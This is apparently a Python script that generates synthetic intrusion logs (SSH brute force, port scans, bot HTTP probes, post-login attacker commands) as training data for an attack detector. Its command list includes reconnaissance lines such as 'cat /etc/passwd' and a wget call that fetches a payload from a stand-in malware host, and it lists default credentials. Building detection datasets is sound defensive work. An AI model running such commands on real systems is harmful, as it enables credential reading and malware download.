"""
synthetic data gen

brute force attempts
port scan
human attacker (cli command)
auto bots

"""

import json
import random
from datetime import date ,datetime, timedelta
from pathlib import Path

#config
output_dir = Path("ml/data")
output_dir.mkdir(exist_ok=True)

# type distributions
attacker_types = {
    "brute_force": 0.30,
    "scanner": 0.25,
    "human": 0.25,
    "bot": 0.20,
}

USERNAMES = ["root", "admin", "user", "test", "oracle", "postgres", "ubuntu", "pi"]
PASSWORDS = ["123456", "password", "admin", "root", "12345678","test", "1234", "letmein"]

scanner_agents =[
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "Nikto/2.1.6",
    "curl/7.68.0",
    "Wget/1.20.3",
    "python-requests/2.25.1"
]

http_paths = ["/", "/admin", "/login", "/wp-admin", "/phpmyadmin","/.env", "/api/v1/users" , "/robots.txt" ]

commands = ["whoami", "ls -la", "cat /etc/passwd", "uname -a", "wget http://malware.com/payload.<sh", "curl ifconfig.me","ps aux", "netstat -tulpn", "cat /proc/version"]

def generate_ip(attacker_type):
    """generates random ip addresses"""
    if attacker_type == "scanner":
        return f"185.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    elif attacker_type == "bot":
        return f"45.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    else:
        return f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     
def generate_brute_force_attacks(base_time, count=20):
    """stimulate brute force:

    same ip many login attempts
    short time stamp between loging attempts
    multi combo user/pass
    """

    attacks= []
    ip = generate_ip("brute_force")
    current_time = base_time

    for i in range (count):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        success = (username == "root" and password == "123456")

        attack = {
            "timestamp": current_time.isoformat(),
            "source_ip": ip,
            "port": random.choice([22, 23]),
            "service": "ssh" if random.random() > 0.5 else "telnet",
            "event_type": "SSH_LOGIN" if random.random() > 0.5 else "CREDENTIAL_SUBMISSION",
            "details": f"username={username} password={password}",
             "credentials": {
                  "username": username,
                  "password": password
             } if success else None
        }
        attacks.append(attack)
        current_time += timedelta(seconds=random.randint(1,5))

    return attacks

def generate_scanner_attacks(base_time , count= 10):
    """port scan pattern
    quick hits on multi ports
    same ip short window
    """

    attacks= []
    ip = generate_ip("scanner")
    current_time = base_time
    ports_to_scan = [21, 22, 23, 80, 443, 3306, 8080, 6379, 27017]
    scanned_ports = random.sample(ports_to_scan , min(count, len(ports_to_scan)))
    for port in scanned_ports:
         service = {21: "ftp", 22: "ssh", 23: "telnet", 80: "http"}.get(port, "unknown")
         attack = {
            "timestamp": current_time.isoformat(),
            "source_ip": ip,
            "port": port,
            "service": service,
            "event_type": "CONNECTION",
            "details": f"Port scan detected"
         }
         attacks.append(attack)

    return attacks

def generate_bot_attacks(base_time, count=15):
    """auto bot pattern
    
    predictable timing 
    specific path targeting
    consistent user agent
    """
    attacks = []
    ip  = generate_ip("bot")
    current_time = base_time
    user_agent = random.choice(scanner_agents)
    target_path = random.choice(http_paths)


    for i in range(count):
        attack = {
            "timestamp" : current_time.isoformat(),
            "source_ip" : ip,
            "port": 80,
            "service" : "http",
            "event_type" : "HTTP_REQUEST",
            "details" : {
                "method" : "GET",
                "path" : target_path,
                "user_agent" : user_agent
            }
        }
        attacks.append(attack)
        current_time += timedelta(seconds=1)
    
    return attacks
    
def generate_human_attacker(base_time , count=8):
    """Human attacker  - slow , varied timing with commands"""
    attacks = []
    ip = generate_ip("human")
    current_time = base_time

    # successful login
    username = random.choice(USERNAMES)
    password = random.choice(PASSWORDS)

    login_attack = {
        "timestamp": current_time.isoformat(),
        "source_ip": ip,
        "port": 22,
        "service": "ssh",
        "event_type": "SSH_LOGIN",
        "details" : f"username={username} password={password}",
        "credentials":{
            "username": username,
            "password": password
        }
    }
    attacks.append(login_attack)
    current_time += timedelta(seconds=random.randint(3,10))

    for i in range(count):
        command = random.choice(commands)
        attack = {
            "timestamp": current_time.isoformat(),
            "source_ip": ip,
            "port": 22,
            "service": "ssh",
            "event_type": "COMMAND_EXECUTION",
            "details": f"Command: {command}"
        }

        attacks.append(attack)
        current_time += timedelta(seconds=random.randint(2,30))
    return attacks

def generate_day_data(target_date):
    """generate almost 100 attacks for a single day"""

    all_attacks = []
    base_time = datetime(target_date.year , target_date.month, target_date.day,
        hour=random.randint(0,23),
        minute=random.randint(0,59),
        second=random.randint(0,59)
    )

    # type attacks calculation
    
    num_brute_force = int(100 * attacker_types["brute_force"])
    num_scanner = int(100 * attacker_types["scanner"])
    num_human = int(100 * attacker_types["human"])
    num_bot = int(100 * attacker_types["bot"])

    #  sessions with time gaps

    for _ in range(num_brute_force // 20):
        attacks = generate_brute_force_attacks(base_time)
        all_attacks.extend(attacks)
        base_time += timedelta(hours=random.randint(1 ,3))

    for _ in range(num_scanner // 10):
        attacks = generate_scanner_attacks(base_time)
        all_attacks.extend(attacks)
        base_time += timedelta(hours=random.randint(1 ,3))
    
    for _ in range(num_human // 8):
        attacks = generate_human_attacker(base_time)
        all_attacks.extend(attacks)
        base_time += timedelta(hours=random.randint(1 ,3))
        
    for _ in range(num_bot // 15):
        attacks = generate_bot_attacks(base_time)
        all_attacks.extend(attacks)
        base_time += timedelta(hours=random.randint(1,3))
    
    all_attacks.sort(key=lambda x: x["timestamp"])

    return all_attacks

def main():
    """generate 30 days of synthetic attack data"""

    print("Synthetic Attack Data Generator")
    print("="*50)
    
    end_date = datetime.today().date()
    start_date = end_date - timedelta(days=30)

    output_file = output_dir / "synthetic_attacks.jsonl"
    total_attacks = 0

    with open(output_file, "w") as f:
        current_date = start_date
        while current_date <= end_date:
            print(f" generating data for {current_date}... ")
            days_attacks = generate_day_data(current_date)

            for attack in days_attacks:
                f.write(json.dumps(attack) + "\n")
                total_attacks += 1
            current_date += timedelta(days=1)
    print("\n Generation complete!")
    print(f" total attacks generated: {total_attacks: ,}")
    print(f" output file: {output_file}")
    print(f"average per day: {total_attacks // 31: ,}")

    print("\n attacker type distribution:")
    for atype , pct in attacker_types.items():
        count = int(total_attacks * pct)
        print(f"    {atype}: {count:,} ({pct*100:.0f}%)")

if __name__ == "__main__":
    main()